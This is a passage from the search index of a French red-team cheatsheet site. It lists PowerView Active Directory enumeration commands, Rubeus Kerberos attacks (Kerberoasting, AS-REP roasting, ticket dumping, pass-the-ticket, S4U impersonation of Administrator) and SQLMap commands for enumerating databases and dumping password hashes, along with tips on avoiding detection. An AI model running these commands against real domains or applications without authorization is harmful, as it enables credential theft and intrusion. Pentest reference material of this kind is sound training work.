privil\u00e8ges admin local \u00e0 certains utilisateurs/groupes sur des OUs sp\u00e9cifiques.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-quelles-machines-sont-affectees-par-une-gpo-specifique","title":"Trouver quelles machines sont affect\u00e9es par une GPO sp\u00e9cifique","text":"<pre><code>Get-NetOU -GPLink &lt;nom_ou_guid_gpo&gt; | Get-NetComputer\n</code></pre> <ul> <li>Contexte : Identifie les OUs li\u00e9es \u00e0 une GPO, puis liste les ordinateurs dans ces OUs.</li> <li>Usage : Comprendre la port\u00e9e d'application d'une GPO potentiellement int\u00e9ressante.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#relations-de-confiance-active-directory-trusts","title":"\ud83d\udd17 Relations de Confiance Active Directory (Trusts)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-relations-de-confiance-du-domaine","title":"Lister les relations de confiance du domaine","text":"<pre><code>Get-NetDomainTrust [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Affiche les relations de confiance (entrantes, sortantes, type, transitivit\u00e9) \u00e9tablies par le domaine actuel ou sp\u00e9cifi\u00e9.</li> <li>Usage : Identifier des chemins d'attaque potentiels vers d'autres domaines ou for\u00eats.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-relations-de-confiance-de-la-foret","title":"Lister les relations de confiance de la for\u00eat","text":"<pre><code>Get-NetForestTrust [-Forest &lt;nom_foret&gt;]\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re les relations de confiance au niveau de la for\u00eat.</li> <li>Usage : Obtenir une vue d'ensemble des relations entre diff\u00e9rentes for\u00eats.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#recherche-dobjets-et-de-fichiers","title":"\ud83c\udfaf Recherche d'Objets et de Fichiers","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#rechercher-des-objets-ad-avec-un-filtre-ldap","title":"Rechercher des objets AD avec un filtre LDAP","text":"<pre><code>Find-ADObject -LDAPFilter &lt;filtre_ldap&gt; -Properties &lt;prop1,prop2,...&gt;\n# Exemple : Trouver les comptes de service\nFind-ADObject -LDAPFilter '(&amp;(samAccountType=805306368)(msDS-ManagedPasswordInterval=*))' -Properties samaccountname,serviceprincipalname\n</code></pre> <ul> <li>Contexte : Permet des recherches tr\u00e8s sp\u00e9cifiques dans l'AD en utilisant la syntaxe de filtre LDAP.</li> <li>Usage : Recherche avanc\u00e9e d'objets r\u00e9pondant \u00e0 des crit\u00e8res pr\u00e9cis.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#rechercher-des-partages-smb-accessibles","title":"Rechercher des partages SMB accessibles","text":"<pre><code>Invoke-ShareFinder [-ComputerName &lt;liste_ordis&gt;] [-CheckShareAccess] [-Verbose]\n</code></pre> <ul> <li>Contexte : D\u00e9couvre les partages SMB sur les machines sp\u00e9cifi\u00e9es (ou toutes celles du domaine par d\u00e9faut).</li> <li>Usage : Identifier des partages potentiellement int\u00e9ressants. <code>-CheckShareAccess</code> v\u00e9rifie si l'utilisateur courant a des droits de lecture.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#rechercher-des-fichiers-sensibles-sur-les-partages-accessibles","title":"Rechercher des fichiers sensibles sur les partages accessibles","text":"<pre><code>Invoke-FileFinder [-ComputerName &lt;liste_ordis&gt;] -Search &lt;motif&gt; [-Verbose]\n# Exemple : Chercher des fichiers contenant \"password\" dans leur nom\nInvoke-FileFinder -Search \"*password*\"\n</code></pre> <ul> <li>Contexte : Recherche des fichiers correspondant \u00e0 un motif sur les partages SMB accessibles.</li> <li>Usage : Trouver des fichiers de configuration, scripts, backups contenant potentiellement des informations sensibles.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#analyse-des-permissions-acls","title":"\ud83d\udee1\ufe0f Analyse des Permissions (ACLs)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-acls-dun-objet-ad","title":"Lister les ACLs d'un objet AD","text":"<pre><code>Get-ObjectAcl -SamAccountName &lt;nom_objet&gt; [-ResolveGUIDs] [-Domain &lt;nom_domaine&gt;]\n# Alternative :\nGet-ObjectAcl -ADSpath \"LDAP://CN=AdminGroup,OU=Groups,DC=domain,DC=local\" -ResolveGUIDs\n</code></pre> <ul> <li>Contexte : Affiche la liste de contr\u00f4le d'acc\u00e8s (ACL) pour un objet AD sp\u00e9cifique (utilisateur, groupe, ordinateur, OU, GPO...).</li> <li>Usage : Identifier qui a quels droits sur un objet. Crucial pour trouver des chemins d'escalade de privil\u00e8ges (ex: droit d'\u00e9criture sur un groupe admin, droit de r\u00e9initialiser un mot de passe...). <code>-ResolveGUIDs</code> traduit les GUIDs en noms connus.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-des-acls-interessantes-dans-le-domaine","title":"Trouver des ACLs int\u00e9ressantes dans le domaine","text":"<pre><code>Find-InterestingDomainAcl [-ResolveGUIDs] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Recherche automatiquement des configurations d'ACL potentiellement exploitables dans tout le domaine (droits de modification sur des objets privil\u00e9gi\u00e9s, GenericAll, WriteDacl, etc.).</li> <li>Usage : Point de d\u00e9part rapide pour identifier des faiblesses de configuration des permissions AD.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-acls-dun-chemin-de-fichierdossier-local-ou-unc","title":"Lister les ACLs d'un chemin de fichier/dossier (local ou UNC)","text":"<pre><code>Get-PathAcl -Path &lt;chemin&gt;\n# Exemple :\nGet-PathAcl -Path \"\\\\DC01\\SYSVOL\"\n</code></pre> <ul> <li>Contexte : Affiche les permissions NTFS sur un fichier ou un dossier.</li> <li>Usage : V\u00e9rifier les permissions sur des partages r\u00e9seau comme SYSVOL ou NETLOGON.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/","title":"Rubeus","text":"<p>Objectif : Rubeus est un outil C# essentiel pour interagir avec Kerberos au sein d'un environnement Active Directory. Il permet de demander, manipuler, et abuser des tickets Kerberos pour diverses techniques offensives (AS-REP Roasting, Kerberoasting, Pass-The-Ticket, S4U, etc.).</p> <p>Source : https://github.com/GhostPack/Rubeus</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#dump-des-tickets-kerberos-en-memoire","title":"\ud83c\udf9f\ufe0f Dump des tickets Kerberos en m\u00e9moire","text":"<pre><code>Rubeus.exe dump\n</code></pre> <ul> <li>Contexte : Permet de visualiser les tickets Kerberos (TGT et TGS) actuellement mis en cache dans la session utilisateur courante.</li> <li>Usage : Utile pour la reconnaissance (voir quels services l'utilisateur a r\u00e9cemment acc\u00e9d\u00e9s) ou pour extraire des tickets en vue d'une attaque Pass-The-Ticket (PTT).</li> <li>Astuce : Ex\u00e9cuter avec des privil\u00e8ges \u00e9lev\u00e9s peut r\u00e9v\u00e9ler les tickets d'autres sessions utilisateurs sur la machine.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#demander-un-ticket-granting-ticket-tgt","title":"\ud83c\udd95 Demander un Ticket Granting Ticket (TGT)","text":"<pre><code>Rubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /domain:&lt;domain.fqdn&gt; [/outfile:&lt;ticket.kirbi&gt;] [/ptt]\n# Alternative avec hash/cl\u00e9\nRubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;ntlm_hash&gt; /domain:&lt;domain.fqdn&gt; [/ptt]\nRubeus.exe asktgt /user:&lt;username&gt; /aes256:&lt;aes_key&gt; /domain:&lt;domain.fqdn&gt; [/ptt]\n</code></pre> <ul> <li>Contexte : Obtient un TGT pour un utilisateur sp\u00e9cifique si vous disposez de son mot de passe en clair ou de son hash/cl\u00e9 Kerberos. Le TGT est la premi\u00e8re \u00e9tape de l'authentification Kerberos, prouvant l'identit\u00e9 de l'utilisateur aupr\u00e8s du KDC (Key Distribution Center).</li> <li>Usage : Valider des identifiants, obtenir un TGT initial pour demander ensuite des TGS, ou pour une attaque Pass-The-Ticket.</li> <li>Options cl\u00e9s :<ul> <li><code>/user</code>, <code>/password</code> | <code>/rc4</code> | <code>/aes256</code>, <code>/domain</code> : Identifiants n\u00e9cessaires.</li> <li><code>/outfile:</code> : Sauvegarde le ticket obtenu dans un fichier <code>.kirbi</code>.</li> <li><code>/ptt</code> : Injecte directement le ticket obtenu dans la session courante (Pass-The-Ticket).</li> </ul> </li> </ul> <p>[!Attention] Utiliser un mot de passe en clair peut g\u00e9n\u00e9rer des logs suspects. Privil\u00e9giez l'utilisation de hash ou de cl\u00e9 si possible.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#demander-un-ticket-granting-service-tgs","title":"\ud83c\udf9f\ufe0f Demander un Ticket Granting Service (TGS)","text":"<pre><code>Rubeus.exe asktgs /ticket:&lt;base64_tgt&gt; /service:&lt;SPN1,SPN2,...&gt; [/outfile:&lt;ticket.kirbi&gt;] [/ptt]\n</code></pre> <ul> <li>Contexte : Demande un TGS pour acc\u00e9der \u00e0 un ou plusieurs services sp\u00e9cifiques (ex: CIFS pour les partages de fichiers, HTTP pour un site web) en utilisant un TGT valide (obtenu via <code>asktgt</code> ou <code>dump</code>).</li> <li>Usage : N\u00e9cessaire pour interagir avec des services authentifi\u00e9s via Kerberos. Peut aussi \u00eatre utilis\u00e9 pour le Kerberoasting si le SPN correspond \u00e0 un compte utilisateur/service.</li> <li>Options cl\u00e9s :<ul> <li><code>/ticket:</code> : Le TGT de l'utilisateur, encod\u00e9 en Base64. Peut \u00eatre r\u00e9cup\u00e9r\u00e9 via <code>dump</code> ou <code>asktgt</code>.</li> <li><code>/service:</code> : Le(s) Service Principal Name(s) du service cible (ex: <code>cifs/server.domain.local</code>, <code>http/web.domain.local</code>).</li> <li><code>/outfile:</code>, <code>/ptt</code> : Similaire \u00e0 <code>asktgt</code>.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#kerberoasting","title":"\ud83d\udd25 Kerberoasting","text":"<pre><code>Rubeus.exe kerberoast [/outfile:&lt;hashes.txt&gt;] [/stats] [/simple] [/rc4opsec | /aes]\n</code></pre> <ul> <li>Contexte : Technique visant \u00e0 extraire les TGS pour des comptes de service (ou utilisateurs) ayant un SPN configur\u00e9. La partie chiffr\u00e9e du TGS utilise une cl\u00e9 d\u00e9riv\u00e9e du mot de passe du compte de service. En r\u00e9cup\u00e9rant ce TGS, on peut tenter de cracker le mot de passe hors ligne.</li> <li>Usage : Escalade de privil\u00e8ges ou mouvement lat\u00e9ral si un compte de service avec des droits \u00e9lev\u00e9s est compromis.</li> <li>Options cl\u00e9s :<ul> <li><code>/outfile:</code> : Sauvegarde les hashes crackables dans un format compatible avec Hashcat/John.</li> <li><code>/stats</code> : Affiche des statistiques sur les comptes kerberoastables trouv\u00e9s.</li> <li><code>/simple</code> : Format de sortie simplifi\u00e9.</li> <li><code>/rc4opsec</code> : Ne demande que les tickets chiffr\u00e9s avec RC4 (plus ancien, potentiellement plus facile \u00e0 cracker, mais peut \u00e9chouer si RC4 est d\u00e9sactiv\u00e9). Tente d'\u00eatre plus discret.</li> <li><code>/aes</code> : Ne demande que les tickets chiffr\u00e9s avec AES.</li> </ul> </li> </ul> <p>[!Attention] Le Kerberoasting implique des requ\u00eates TGS qui sont g\u00e9n\u00e9ralement logu\u00e9es. Une rafale de requ\u00eates peut \u00eatre d\u00e9tect\u00e9e par les syst\u00e8mes de s\u00e9curit\u00e9 (SIEM, EDR).</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#as-rep-roasting","title":"\ud83d\udd25 AS-REP Roasting","text":"<pre><code>Rubeus.exe asreproast /user:&lt;username&gt; /domain:&lt;domain.fqdn&gt; [/format:hashcat] [/outfile:&lt;hashes.txt&gt;]\n# Pour trouver les utilisateurs vuln\u00e9rables :\nRubeus.exe asreproast /user: /domain:&lt;domain.fqdn&gt; /format:hashcat /outfile:&lt;hashes.txt&gt;\n</code></pre> <ul> <li>Contexte : Exploite les comptes utilisateurs pour lesquels la pr\u00e9-authentification Kerberos est d\u00e9sactiv\u00e9e (<code>DONT_REQ_PREAUTH</code>). Un attaquant peut demander une partie des donn\u00e9es d'authentification (AS-REP) pour ces comptes sans fournir de mot de passe. Cette donn\u00e9e contient une partie chiffr\u00e9e avec la cl\u00e9 d\u00e9riv\u00e9e du mot de passe de l'utilisateur, qui peut \u00eatre crack\u00e9e hors ligne.</li> <li>Usage : Obtenir le hash du mot de passe d'utilisateurs vuln\u00e9rables, potentiellement sans avoir besoin d'un compte de domaine valide au pr\u00e9alable (si on conna\u00eet les noms d'utilisateurs).</li> <li>Options cl\u00e9s :<ul> <li><code>/user:</code> : L'utilisateur cible (ou laisser vide pour rechercher tous les utilisateurs vuln\u00e9rables si vous \u00eates authentifi\u00e9).</li> <li><code>/domain:</code> : Le domaine cible.</li> <li><code>/format:hashcat</code> : Formate la sortie pour Hashcat.</li> <li><code>/outfile:</code> : Sauvegarde les hashes crackables.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#pass-the-ticket-ptt","title":"\ud83c\udfad Pass-The-Ticket (PTT)","text":"<pre><code>Rubeus.exe ptt /ticket:&lt;base64_ticket&gt; [/luid:&lt;logon_id&gt;]\n</code></pre> <ul> <li>Contexte : Injecte un ticket Kerberos existant (TGT ou TGS, souvent au format <code>.kirbi</code> encod\u00e9 en Base64) dans la m\u00e9moire de la session courante ou une autre session sp\u00e9cifi\u00e9e.</li> <li>Usage : Permet d'usurper l'identit\u00e9 associ\u00e9e au ticket pour acc\u00e9der aux ressources sans conna\u00eetre le mot de passe du compte. Tr\u00e8s utile pour le mouvement lat\u00e9ral apr\u00e8s avoir extrait des tickets (ex: via <code>dump</code> sur une autre machine ou <code>mimikatz</code>).</li> <li>Options cl\u00e9s :<ul> <li><code>/ticket:</code> : Le ticket Kerberos (TGT ou TGS) encod\u00e9 en Base64.</li> <li><code>/luid:</code> : (Optionnel) L'ID de session cible pour l'injection (utile si on a les privil\u00e8ges pour injecter dans la session d'un autre utilisateur).</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#renouveler-un-tgt","title":"\u267b\ufe0f Renouveler un TGT","text":"<pre><code>Rubeus.exe renew /ticket:&lt;base64_tgt&gt; [/ptt]\n</code></pre> <ul> <li>Contexte : Si un TGT est marqu\u00e9 comme renouvelable (\"Renewable\"), cette commande tente de prolonger sa dur\u00e9e de validit\u00e9 aupr\u00e8s du KDC.</li> <li>Usage : Maintenir l'acc\u00e8s via un TGT compromis sur une plus longue p\u00e9riode.</li> <li>Options cl\u00e9s :<ul> <li><code>/ticket:</code> : Le TGT renouvelable, encod\u00e9 en Base64.</li> <li><code>/ptt</code> : Injecte le ticket renouvel\u00e9 dans la session courante.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#surveiller-les-evenements-de-tickets-kerberos","title":"\ud83d\udd0d Surveiller les \u00e9v\u00e9nements de tickets Kerberos","text":"<pre><code>Rubeus.exe monitor [/interval:&lt;seconds&gt;] [/filteruser:&lt;user_sid&gt;] [/targetuser:&lt;user_sid&gt;]\n</code></pre> <ul> <li>Contexte : \u00c9coute et affiche les \u00e9v\u00e9nements li\u00e9s aux tickets Kerberos (cr\u00e9ation, renouvellement, etc.) qui se produisent dans la session de connexion actuelle ou pour un utilisateur cible si les privil\u00e8ges le permettent.</li> <li>Usage : Utile pour la reconnaissance dynamique, comprendre les flux d'authentification ou capturer des tickets au moment de leur cr\u00e9ation (par exemple, si un admin se connecte).</li> <li>Options cl\u00e9s :<ul> <li><code>/interval:</code> : Intervalle (en secondes) entre chaque v\u00e9rification des \u00e9v\u00e9nements (d\u00e9faut: 60).</li> <li><code>/filteruser:</code> : Ne surveiller que les \u00e9v\u00e9nements pour un utilisateur sp\u00e9cifique (par SID).</li> <li><code>/targetuser:</code> : Sp\u00e9cifie l'utilisateur dont la session doit \u00eatre surveill\u00e9e (n\u00e9cessite des privil\u00e8ges \u00e9lev\u00e9s).</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#purger-les-tickets-kerberos","title":"\ud83e\uddf9 Purger les tickets Kerberos","text":"<pre><code>Rubeus.exe purge [/luid:&lt;logon_id&gt;]\n</code></pre> <ul> <li>Contexte : Supprime tous les tickets Kerberos de la session courante ou d'une session sp\u00e9cifi\u00e9e.</li> <li>Usage : Nettoyer les tickets apr\u00e8s une op\u00e9ration, forcer une nouvelle authentification, ou effacer les traces d'un ticket inject\u00e9 via PTT.</li> <li>Options cl\u00e9s :<ul> <li><code>/luid:</code> : (Optionnel) L'ID de la session dont les tickets doivent \u00eatre purg\u00e9s.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#i-decrire-un-ticket-kerberos","title":"\u2139\ufe0f D\u00e9crire un ticket Kerberos","text":"<pre><code>Rubeus.exe describe /ticket:&lt;base64_ticket&gt;\n</code></pre> <ul> <li>Contexte : D\u00e9code et affiche les informations contenues dans un ticket Kerberos (encod\u00e9 en Base64).</li> <li>Usage : Analyser un ticket pour conna\u00eetre l'utilisateur, le service cible, la dur\u00e9e de validit\u00e9, les flags, etc.</li> <li>Options cl\u00e9s :<ul> <li><code>/ticket:</code> : Le ticket Kerberos (TGT ou TGS) encod\u00e9 en Base64.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#calculer-des-hashescles-kerberos","title":"\ud83d\udd11 Calculer des Hashes/Cl\u00e9s Kerberos","text":"<pre><code>Rubeus.exe hash /password:&lt;password&gt; [/user:&lt;username&gt;] [/domain:&lt;domain&gt;]\n</code></pre> <ul> <li>Contexte : Calcule les diff\u00e9rents hashes et cl\u00e9s Kerberos (NTLM, RC4_HMAC, AES128, AES256) \u00e0 partir d'un mot de passe en clair.</li> <li>Usage : Utile pour obtenir les cl\u00e9s n\u00e9cessaires \u00e0 certaines attaques (comme <code>asktgt</code> avec <code>/aes256</code>) si vous avez le mot de passe mais pas les cl\u00e9s/hashes directement.</li> <li>Options cl\u00e9s :<ul> <li><code>/password:</code> : Le mot de passe \u00e0 hacher.</li> <li><code>/user:</code>, <code>/domain:</code> : (Optionnel) Utilis\u00e9s pour calculer certains salts sp\u00e9cifiques.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#creer-une-session-lancer-un-processus-avec-un-ticket-s4u","title":"\ud83d\udcbb Cr\u00e9er une session / Lancer un processus avec un ticket (S4U)","text":"<pre><code># Obtenir un TGS pour le compte machine cible, en usurpant un utilisateur (ex: Administrator)\nRubeus.exe s4u /user:&lt;compte_service$&gt; /aes256:&lt;cl\u00e9_aes_compte_service&gt; /impersonateuser:&lt;utilisateur_a_usurper&gt; /msdsspn:&lt;SPN_machine_cible&gt; /altservice:&lt;service_alternatif&gt; /ptt\n\n# Exemple : Obtenir un ticket CIFS pour DC01 en tant qu'Administrator, en utilisant le compte SVC_RUBEUS$\nRubeus.exe s4u /user:SVC_RUBEUS$ /aes256:xxx /impersonateuser:Administrator /msdsspn:cifs/DC01.domain.local /altservice:host /ptt\n</code></pre> <ul> <li>Contexte : L'extension S4U (Service for User) permet \u00e0 un service (poss\u00e9dant un TGT) de demander un TGS pour un autre service au nom d'un utilisateur sp\u00e9cifique, m\u00eame si cet utilisateur ne s'est pas directement authentifi\u00e9 aupr\u00e8s du service initial. C'est la base des attaques de d\u00e9l\u00e9gation contrainte (Constrained Delegation).</li> <li>Usage : Permet \u00e0 un compte de service (que vous contr\u00f4lez, avec sa cl\u00e9/hash) d'obtenir des tickets de service pour acc\u00e9der \u00e0 d'autres machines comme si il \u00e9tait un autre utilisateur (souvent un admin). Apr\u00e8s <code>/ptt</code>, vous pouvez acc\u00e9der au service cible (ex: <code>dir \\\\DC01\\C$</code>).</li> <li>Options cl\u00e9s :<ul> <li><code>/user:</code> : Le compte de service que vous contr\u00f4lez (avec son nom et le <code>$</code>).</li> <li><code>/aes256:</code> (ou <code>/rc4:</code>) : La cl\u00e9 ou le hash du compte de service.</li> <li><code>/impersonateuser:</code> : L'utilisateur dont vous voulez usurper l'identit\u00e9.</li> <li><code>/msdsspn:</code> : Le SPN du service/machine cible auquel vous voulez acc\u00e9der.</li> <li><code>/altservice:</code> : (Optionnel) Permet de demander un ticket pour un type de service diff\u00e9rent (ex: <code>host</code> au lieu de <code>cifs</code>) pour contourner certaines restrictions.</li> <li><code>/ptt</code> : Injecte le ticket TGS obtenu.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Rubeus/#creer-une-session-reseau-sans-ticket-local-createnetonly","title":"\ud83c\udf10 Cr\u00e9er une session r\u00e9seau sans ticket local (Createnetonly)","text":"<pre><code>Rubeus.exe createnetonly /program:&lt;chemin_executable&gt; [/show]\n</code></pre> <ul> <li>Contexte : Lance un processus (ex: <code>cmd.exe</code>, <code>powershell.exe</code>) avec des informations d'identification r\u00e9seau \"vides\". Cela cr\u00e9e une nouvelle session de connexion (Logon Session) qui n'a pas de tickets Kerberos locaux.</li> <li>Usage : Tr\u00e8s utile pour utiliser des tickets inject\u00e9s via PTT dans un contexte propre, sans interf\u00e9rence des tickets de votre session utilisateur actuelle. Apr\u00e8s avoir lanc\u00e9 <code>createnetonly</code>, vous pouvez utiliser <code>Rubeus.exe ptt /luid:&lt;nouvel_id_session&gt; /ticket:&lt;base64_ticket&gt;</code> pour injecter un ticket sp\u00e9cifiquement dans cette nouvelle session.</li> <li>Options cl\u00e9s :<ul> <li><code>/program:</code> : Le programme \u00e0 lancer (ex: <code>C:\\Windows\\System32\\cmd.exe</code>).</li> <li><code>/show</code> : (Optionnel) Affiche la fen\u00eatre du nouveau processus au lieu de la cacher.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/","title":"SQLMap","text":"<p>Objectif : SQLMap est un outil open-source d'audit de s\u00e9curit\u00e9 et de test de p\u00e9n\u00e9tration qui automatise le processus de d\u00e9tection et d'exploitation des vuln\u00e9rabilit\u00e9s d'injection SQL, permettant ainsi de prendre le contr\u00f4le des serveurs de bases de donn\u00e9es.</p> <p>Source : https://github.com/sqlmapproject/sqlmap | http://sqlmap.org/</p> <p>OPSEC : SQLMap peut g\u00e9n\u00e9rer un trafic tr\u00e8s important et suspect. Son utilisation est facilement d\u00e9tectable par les WAFs (Web Application Firewalls), IDS/IPS et les \u00e9quipes de s\u00e9curit\u00e9 si des pr\u00e9cautions (tampers, d\u00e9lais, user-agent al\u00e9atoire) ne sont pas prises.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#ciblage-et-scan-de-base","title":"\ud83c\udfaf Ciblage et Scan de Base","text":""},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#specifier-une-url-cible-parametre-get","title":"Sp\u00e9cifier une URL cible (param\u00e8tre GET)","text":"<pre><code>sqlmap -u \"[http://exemple.com/produits?id=1](http://exemple.com/produits?id=1)\"\n</code></pre> <ul> <li>Contexte : Lance un scan de base sur l'URL fournie, testant les param\u00e8tres GET (ici <code>id</code>).</li> <li>Usage : Point d'entr\u00e9e le plus simple pour tester une URL.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#specifier-une-url-cible-avec-des-donnees-post","title":"Sp\u00e9cifier une URL cible avec des donn\u00e9es POST","text":"<pre><code>sqlmap -u \"[http://exemple.com/login](http://exemple.com/login)\" --data=\"username=admin&amp;password=pass\"\n</code></pre> <ul> <li>Contexte : Teste les param\u00e8tres envoy\u00e9s dans le corps d'une requ\u00eate POST.</li> <li>Usage : Pour les formulaires de connexion, de recherche, etc.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#analyser-une-requete-depuis-un-fichier-burp-suite-zap","title":"Analyser une requ\u00eate depuis un fichier (Burp Suite, ZAP)","text":"<pre><code>sqlmap -r request.txt\n</code></pre> <ul> <li>Contexte : Lit une requ\u00eate HTTP compl\u00e8te (y compris les en-t\u00eates, cookies, m\u00e9thode POST/GET) depuis un fichier texte.</li> <li>Usage : Tr\u00e8s pratique pour rejouer et tester des requ\u00eates complexes intercept\u00e9es avec un proxy comme Burp Suite ou ZAP.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#specifier-un-parametre-specifique-a-tester","title":"Sp\u00e9cifier un param\u00e8tre sp\u00e9cifique \u00e0 tester","text":"<pre><code>sqlmap -u \"[http://exemple.com/produits?id=1&amp;cat=2](http://exemple.com/produits?id=1&amp;cat=2)\" -p id\n</code></pre> <ul> <li>Contexte : Ne teste que le param\u00e8tre <code>id</code> pour l'injection SQL, ignorant les autres (<code>cat</code> ici).</li> <li>Usage : Acc\u00e9l\u00e9rer le scan en se concentrant sur un param\u00e8tre jug\u00e9 potentiellement vuln\u00e9rable.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#utiliser-un-cookie-dauthentification","title":"Utiliser un cookie d'authentification","text":"<pre><code>sqlmap -u \"[http://exemple.com/profil?id=1](http://exemple.com/profil?id=1)\" --cookie=\"sessionid=abcdef12345\"\n</code></pre> <ul> <li>Contexte : Inclut le cookie sp\u00e9cifi\u00e9 dans toutes les requ\u00eates, permettant de tester des pages n\u00e9cessitant une authentification.</li> <li>Usage : Essentiel pour auditer des zones authentifi\u00e9es d'une application web.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#ajustement-du-scan-niveau-et-risque","title":"\u2699\ufe0f Ajustement du Scan (Niveau et Risque)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#augmenter-le-niveau-de-test-plus-de-payloadstypes-dinjection","title":"Augmenter le niveau de test (plus de payloads/types d'injection)","text":"<pre><code>sqlmap -r request.txt --level=5\n</code></pre> <ul> <li>Contexte : Augmente la profondeur des tests. <code>level</code> va de 1 (d\u00e9faut) \u00e0 5 (maximum). Un niveau plus \u00e9lev\u00e9 teste plus de types d'injections (ex: time-based blind, injections dans les en-t\u00eates comme User-Agent, Referer).</li> <li>Usage : Pour des scans plus exhaustifs, mais plus lents et potentiellement plus bruyants.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#augmenter-le-risque-tests-potentiellement-plus-dangereux","title":"Augmenter le risque (tests potentiellement plus dangereux)","text":"<pre><code>sqlmap -r request.txt --risk=3\n</code></pre> <ul> <li>Contexte : Augmente l'agressivit\u00e9 des tests. <code>risk</code> va de 1 (d\u00e9faut) \u00e0 3 (maximum). Un risque plus \u00e9lev\u00e9 utilise des payloads qui pourraient potentiellement modifier des donn\u00e9es ou causer des erreurs (ex: injections SQL lourdes).</li> <li>Usage : \u00c0 utiliser avec prudence, surtout sur des environnements de production.</li> </ul> <p>[!Astuce] Combiner <code>--level=5 --risk=3</code> permet le scan le plus complet possible, mais aussi le plus lent et le plus risqu\u00e9/bruyant.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#enumeration-de-la-base-de-donnees","title":"\ud83d\udd0e \u00c9num\u00e9ration de la Base de Donn\u00e9es","text":"<p>Une fois qu'une injection est confirm\u00e9e, ces commandes permettent d'explorer la structure et le contenu de la base de donn\u00e9es.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#lister-les-bases-de-donnees-disponibles","title":"Lister les bases de donn\u00e9es disponibles","text":"<pre><code>sqlmap -r request.txt --dbs\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#lister-les-tables-dune-base-de-donnees-specifique","title":"Lister les tables d'une base de donn\u00e9es sp\u00e9cifique","text":"<pre><code>sqlmap -r request.txt -D &lt;nom_db&gt; --tables\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#lister-les-colonnes-dune-table-specifique","title":"Lister les colonnes d'une table sp\u00e9cifique","text":"<pre><code>sqlmap -r request.txt -D &lt;nom_db&gt; -T &lt;nom_table&gt; --columns\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#obtenir-lutilisateur-actuel-de-la-base-de-donnees","title":"Obtenir l'utilisateur actuel de la base de donn\u00e9es","text":"<pre><code>sqlmap -r request.txt --current-user\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#obtenir-le-nom-de-la-base-de-donnees-actuelle","title":"Obtenir le nom de la base de donn\u00e9es actuelle","text":"<pre><code>sqlmap -r request.txt --current-db\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#verifier-si-lutilisateur-actuel-est-administrateur-dba","title":"V\u00e9rifier si l'utilisateur actuel est administrateur (DBA)","text":"<pre><code>sqlmap -r request.txt --is-dba\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#tenter-de-dumper-les-hashes-des-mots-de-passe-si-possible","title":"Tenter de dumper les hashes des mots de passe (si possible)","text":"<pre><code>sqlmap -r request.txt --passwords\n</code></pre> <ul> <li>Pr\u00e9requis : N\u00e9cessite souvent des privil\u00e8ges \u00e9lev\u00e9s et d\u00e9pend du type de SGBD.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#dump-des-donnees","title":"\ud83d\udcbe Dump des Donn\u00e9es","text":""},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#dumper-le-contenu-dune-table","title":"Dumper le contenu d'une table","text":"<pre><code>sqlmap -r request.txt -D &lt;nom_db&gt; -T &lt;nom_table&gt; 